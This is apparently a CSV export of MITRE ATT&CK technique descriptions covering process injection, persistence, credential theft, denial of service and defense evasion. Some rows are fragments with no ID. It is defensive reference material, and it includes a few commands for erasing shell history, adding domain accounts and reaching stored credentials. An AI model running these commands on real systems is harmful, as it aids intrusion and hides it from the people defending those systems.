T1055.008,Process Injection: Ptrace System Calls,"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.    Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.   [1]    Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex:  malloc ) then invoking that memory with  PTRACE_SETREGS  to set the register containing the next instruction to execute. Ptrace system call injection can also be done with  PTRACE_POKETEXT / PTRACE_POKEDATA , which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction).    [1]      [2]       Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.   [3]       Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",Description
T1036.007,Masquerading: Double File Extension,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex:  File.txt.exe  may render in some views as just  File.txt ). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.   [1]      [2]       Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain  Initial Access  into a user’s system via  Spearphishing Attachment  then  User Execution . For example, an executable file attachment named  Evil.txt.exe  may display as  Evil.txt  to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.   [2]      Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",Description

There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.   Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.

T1499.001,Endpoint Denial of Service: OS Exhaustion Flood,"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.   Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.   [1]    With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.   [2]      ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.   [3]",Description
T1588.005,Obtain Capabilities: Exploits,"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.   [1]      [2]      [3]      In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.   [4]      [5]    In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).   [2]      An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.   Adversaries may use exploits during various phases of the adversary lifecycle (i.e.  Exploit Public-Facing Application ,  Exploitation for Client Execution ,  Exploitation for Privilege Escalation ,  Exploitation for Defense Evasion ,  Exploitation for Credential Access ,  Exploitation of Remote Services , and  Application or System Exploitation ).",Description

T1546.011,Event Triggered Execution: Application Shimming,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.    [1]      Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.    A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:   Custom databases are stored in:   To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to  Bypass User Account Control  (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).   Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.    [2]    Shims can also be abused to establish persistence by continuously being invoked by affected programs.",Description

Use of multiple stages may obfuscate the command and control channel to make detection more difficult.   Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.   The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or  Fallback Channels  in case the original first-stage communication path is discovered and blocked.",Description

T1602.001,Data from Configuration Repository: SNMP (MIB Dump),"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).   The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages   [1]   . The MIB may also contain device operational information, including running configuration, routing table, and interface details.   Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.   [2]      [3]",Description
T1529,System Shutdown or Reboot,"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via  Network Device CLI  (e.g.  reload ).   [1]      [2]    Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.

T1583.004,Acquire Infrastructure: Server,"Adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of compromising a third-party  Server  or renting a  Virtual Private Server , adversaries may opt to configure and run their own servers in support of operations.   Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.   [1]",Description

T1499.004,Endpoint Denial of Service: Application or System Exploitation,"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.    [1]    Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.   Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as  Data Destruction ,  Firmware Corruption ,  Service Stop  etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",Description

T1053.006,Scheduled Task or Job: Systemd Timers,"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension  .timer  that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to  Cron  in Linux environments.   [1]    Systemd timers may be activated remotely via the  systemctl  command line utility, which operates over  SSH .   [2]      Each  .timer  file must have a corresponding  .service  file with the same name, e.g.,  example.timer  and  example.service .  .service  files are  Systemd Service  unit files that are managed by the systemd system and service manager.   [3]    Privileged timers are written to  /etc/systemd/system/  and  /usr/lib/systemd/system  while user level are written to  ~/.config/systemd/user/ .   An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.   [4]      [5]      [6]    Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.",Description
T1553,Subvert Trust Controls,"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.   Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct  File and Directory Permissions Modification  or  Modify Registry  in support of subverting these controls.   [1]    Adversaries may also create or steal code signing certificates to acquire trust on target systems.   [2]      [3]",Description

T1547.002,Boot or Logon Autostart Execution: Authentication Package,"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.   [1]      Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\  with the key value of  ""Authentication Packages""=&lt;target binary&gt; . The binary will then be executed by the system when the authentication packages are loaded.",Description

T1011,Exfiltration Over Other Network Medium,"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.   Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",Description
T1136.002,Create Account: Domain Account,"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the  net user /add /domain  command can be used to create a domain account.   Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",Description

T1621,Multi-Factor Authentication Request Generation,"Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.   Adversaries in possession credentials to  Valid Accounts  may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account.   In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to ""MFA fatigue.""   [1]      [2]      [3]",Description

T1546.006,Event Triggered Execution: LC_LOAD_DYLIB Addition,"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.   [1]    There are tools available to perform these changes.   Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.   [2]",Description
T1555.004,Credentials from Password Stores: Windows Credential Manager,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).   [1]      [2]      The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of  Credentials from Web Browsers , Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.   Credential Lockers store credentials in encrypted  .vcrd  files, located under  %Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\ . The encryption key can be found in a file named  Policy.vpol , typically located in the same folder as the credentials.   [3]      [4]      Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms.  vaultcmd.exe  is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as  CredEnumerateA , may also be absued to list credentials managed by the Credential Manager.   [5]      [6]      Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running  rundll32.exe keymgr.dll KRShowKeyMgr  then selecting the ""Back up..."" button on the ""Stored User Names and Passwords"" GUI.   Password recovery tools may also obtain plain text passwords from the Credential Manager.   [4]",Description

T1543,Create or Modify System Process,"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.   [1]    On macOS, launchd processes known as  Launch Daemon  and  Launch Agent  are run to finish system initialization and load user specific parameters.   [2]       Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.     Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.   [3]",Description
T1543,Create or Modify System Process,Exaramel for Linux  has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.   [4],Procedure Examples
T1040,Network Sniffing,"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.   Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as  LLMNR/NBT-NS Poisoning and SMB Relay , can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.   Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.   In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.   [1]       [2]       [3]    Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.   [4]       [5]    The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.    [4]",Description
T1040,Network Sniffing,"APT28  deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.

T1588.004,Obtain Capabilities: Digital Certificates,"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.   Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex:  Asymmetric Cryptography  with  Web Protocols ) or even enabling  Adversary-in-the-Middle  if the certificate is trusted or otherwise added to the root of trust (i.e.  Install Root Certificate ). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.   [1]    Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.

T1601.002,Modify System Image: Downgrade System Image,"Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features.    [1]      On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.   Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as  Weaken Encryption .  Downgrading of a system image can be done on its own, or it can be used in conjunction with  Patch System Image .",Description
T1583.007,Acquire Infrastructure: Serverless,"Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.   Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to  Proxy  traffic to an adversary-owned command and control server.   [1]      [2]    As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.   [3]      [1]",Description
T1195.003,Supply Chain Compromise: Compromise Hardware Supply Chain,"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",Description
T1505.002,Server Software Component: Transport Agent,"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.   [1]      [2]    Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.    Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.   [2]    Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",Description

T1484,Domain Policy Modification,"Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.   With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious  Scheduled Task  to computers throughout the domain environment   [1]      [2]      [3]    or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.   [4]    Adversaries can also change configuration settings within the AD environment to implement a  Rogue Domain Controller .   Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",Description

T1559.003,Inter-Process Communication: XPC Services,"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service  C API  or the high level  NSXPCConnection API  in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.   [1]      [2]      Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.

[1]      This is technically a deprecated technology (superseded by  Launch Daemon ), and thus the appropriate folder,  /Library/StartupItems  isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist),  StartupParameters.plist , reside in the top-level directory.    An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.

T1566.003,Phishing: Spearphishing via Service,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.    All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.   A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",Description

T1562.003,Impair Defenses: Impair Command History Logging,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.    On Linux and macOS, command history is tracked in a file pointed to by the environment variable  HISTFILE . When a user logs off a system, this information is flushed to a file in the user's home directory called  ~/.bash_history . The  HISTCONTROL  environment variable keeps track of what should be saved by the  history  command and eventually into the  ~/.bash_history  file when a user logs out.  HISTCONTROL  does not exist by default on macOS, but can be set by the user and will be respected.   Adversaries may clear the history environment variable ( unset HISTFILE ) or set the command history size to zero ( export HISTFILESIZE=0 ) to prevent logging of commands. Additionally,  HISTCONTROL  can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"".  HISTCONTROL  can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that "" ls"" will not be saved, but ""ls"" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.    On Windows systems, the  PSReadLine  module tracks commands used in all PowerShell sessions and writes them to a file ( $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  by default). Adversaries may change where these logs are saved using  Set-PSReadLineOption -HistorySavePath {File Path} . This will cause  ConsoleHost_history.txt  to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command  Set-PSReadlineOption -HistorySaveStyle SaveNothing .   [1]      [2]      [3]      Adversaries may also leverage a  Network Device CLI  on network devices to disable historical command logging (e.g.  no logging ).",Description

Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization.    The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:   Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as  Sharepoint  and  Confluence , specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",Description

T1608.003,Stage Capabilities: Install Digital Certificate,"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.   [1]      Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex:  Asymmetric Cryptography  with  Web Protocols ) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers.    Adversaries can obtain digital certificates (see  Digital Certificates ) or create self-signed certificates (see  Digital Certificates ). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ( Acquire Infrastructure ) or previously compromised ( Compromise Infrastructure ).",Description

T1553.005,Subvert Trust Controls: Mark-of-the-Web Bypass,"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named  Zone.Identifier  with a specific value known as the MOTW.   [1]    Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file in not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.   [2]      [3]      [4]      Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.   [2]      [3]",Description

T1055.012,Process Injection: Process Hollowing,"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.     Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as  CreateProcess , which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as  ZwUnmapViewOfSection  or  NtUnmapViewOfSection   before being written to, realigned to the injected code, and resumed via  VirtualAllocEx ,  WriteProcessMemory ,  SetThreadContext , then  ResumeThread  respectively.   [1]      [2]      This is very similar to  Thread Local Storage  but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",Description

T1055.001,Process Injection: Dynamic-link Library Injection,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.     DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as  VirtualAllocEx  and  WriteProcessMemory , then invoked with  CreateRemoteThread  (which calls the  LoadLibrary  API responsible for loading the DLL).    [1]       Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of  LoadLibrary ).   [2]      [1]       Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's  AddressOfEntryPoint  before starting a new thread in the target process.   [3]    This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.   [4]       Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",Description

T1574.009,Hijack Execution Flow: Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description

T1600,Weaken Encryption,"Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.    [1]      Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.   Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as  Modify System Image ,  Reduce Key Space , and  Disable Crypto Hardware , an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts.    [2]",Description

T1574.001,Hijack Execution Flow: DLL Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.    [1]      [2]    Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.   There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,    [3]    by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.   [4]    Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.    [5]      Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.   [6]      [7]      [8]      If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",Description

